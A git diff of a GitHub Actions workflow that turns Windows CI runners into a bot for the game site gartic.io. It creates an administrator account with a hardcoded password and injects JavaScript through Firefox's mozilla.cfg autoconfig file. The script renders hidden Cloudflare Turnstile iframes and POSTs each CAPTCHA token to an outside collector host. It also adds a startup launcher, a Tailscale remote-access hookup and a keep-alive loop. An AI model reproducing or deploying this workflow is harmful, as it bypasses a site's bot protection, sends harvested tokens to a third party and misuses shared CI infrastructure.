@@ -2,8 +2,8 @@ name: ˢᵃᶤᶠ ₉₁
 
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '0 */6 * * *'
+  push:
+    branches: [ main ]
 
 jobs:
   gartic-bot:
@@ -14,61 +14,58 @@ jobs:
         rdp_node: [1, 2]
 
     steps:
-      - name: 1. Setup User
+      - name: 1. Setup
         run: |
           $pass = "admin@123"
           $secPass = ConvertTo-SecureString $pass -AsPlainText -Force
           New-LocalUser -Name "saif123" -Password $secPass -AccountNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "saif123"
 
-      - name: 2. Inject YOUR Script (FIXED)
+      - name: 2. Inject Script
         run: |
           $dir = "C:\Program Files\Mozilla Firefox"
           if (!(Test-Path "$dir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$dir\defaults\pref" }
-          
-          # تفعيل ملف الإعدادات
           'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);' | Out-File "$dir\defaults\pref\local-settings.js" -Encoding ASCII -Force
+          
+          $js = @"
+          try {
+              window.addEventListener('load', function() {
+                  if (location.href.includes('gartic.io')) {
+                      if(!navigator.userAgentData){
+                          navigator.userAgentData={getHighEntropyValues:function(){return Promise.resolve({});}};
+                      }
+                      setInterval(function(){ location.reload(); }, 50000);
+                      function send(t){
+                          if(typeof t !== 'string' || t.length <= 20) return;
+                          fetch('https://www.xsw.work.gd/add-token', {
+                              method: 'POST',
+                              headers: {'Content-Type': 'application/json'},
+                              body: JSON.stringify({token: t})
+                          }).catch(function(){});
+                      }
+                      window.addEventListener('message', function(e){
+                          if(e.data && typeof e.data === 'string'){ send(e.data); }
+                      });
+                      for(var i=0; i<6; i++){
+                          var f=document.createElement('iframe');
+                          f.style.display='none';
+                          f.srcdoc='<html><body><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><div id="cf-turnstile"></div><script>function r(){try{window.turnstile.render("#cf-turnstile",{sitekey:"0x4AAAAAABBPKaIbNwnPEfSo",callback:function(t){parent.postMessage(t,"*");}});}catch(e){}}setInterval(r,3000);setTimeout(r,500);</script></body></html>';
+                          document.body.appendChild(f);
+                      }
+                  }
+              });
+          } catch (e){}
+          "@
+          ("//" + "`n" + $js) | Out-File "$dir\mozilla.cfg" -Encoding ASCII -Force
 
-          # كتابة السكربت بطريقة الـ "Here-String" لتجنب أخطاء الفواصل والرموز
-          $jsCode = @'
-try {
-    window.addEventListener('load', function() {
-        if (location.href.includes('gartic.io')) {
-            if(!navigator.userAgentData){
-                navigator.userAgentData={getHighEntropyValues:function(){return Promise.resolve({});}};
-            }
-            setInterval(function(){ location.reload(); }, 50000);
-            function send(t){
-                if(typeof t !== 'string' || t.length <= 20) return;
-                fetch('https://www.xsw.work.gd/add-token', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({token: t})
-                }).catch(function(){});
-            }
-            window.addEventListener('message', function(e){
-                if(e.data && typeof e.data === 'string'){ send(e.data); }
-            });
-            for(var i=0; i<6; i++){
-                var f=document.createElement('iframe');
-                f.style.display='none';
-                f.srcdoc='<html><body><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><div id="cf-turnstile"></div><script>function r(){try{window.turnstile.render("#cf-turnstile",{sitekey:"0x4AAAAAABBPKaIbNwnPEfSo",callback:function(t){parent.postMessage(t,"*");}});}catch(e){}}setInterval(r,3500);setTimeout(r,500);</script></body></html>';
-                document.body.appendChild(f);
-            }
-        }
-    });
-} catch (e){}
-'@
-          $finalConfig = "//`n" + $jsCode
-          $finalConfig | Out-File "$dir\mozilla.cfg" -Encoding ASCII -Force
-
-      - name: 3. Auto-Start (2 Tabs)
+      - name: 3. Startup
         run: |
-          $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-          $batch = '"C:\Program Files\Mozilla Firefox\firefox.exe" -url https://gartic.io -url https://gartic.io'
-          $batch | Out-File "$startup\run.bat" -Encoding ASCII
+          $path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+          if (!(Test-Path $path)) { New-Item -ItemType Directory -Force -Path $path }
+          $cmd = '"C:\Program Files\Mozilla Firefox\firefox.exe" -url https://gartic.io -url https://gartic.io'
+          $cmd | Out-File "$path\run.bat" -Encoding ASCII
 
-      - name: 4. Tailscale & Launch
+      - name: 4. Tailscale
         run: |
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
           Invoke-WebRequest -Uri $tsUrl -OutFile "$env:TEMP\tailscale.exe"
@@ -76,10 +73,7 @@ try {
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="node-${{ matrix.rdp_node }}"
           Start-Process "C:\Program Files\Mozilla Firefox\firefox.exe" "-url https://gartic.io -url https://gartic.io"
 
-      - name: 5. Display & Keep Alive
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: 5. Stay Alive
         run: |
-          echo "::notice title=READY::Script Injected & Bot Running"
-          Start-Sleep -Seconds 20700
-          gh workflow run "ˢᵃᶤᶠ ₉₁"
+          Write-Host "Bot is active..."
+          Start-Sleep -Seconds 20000
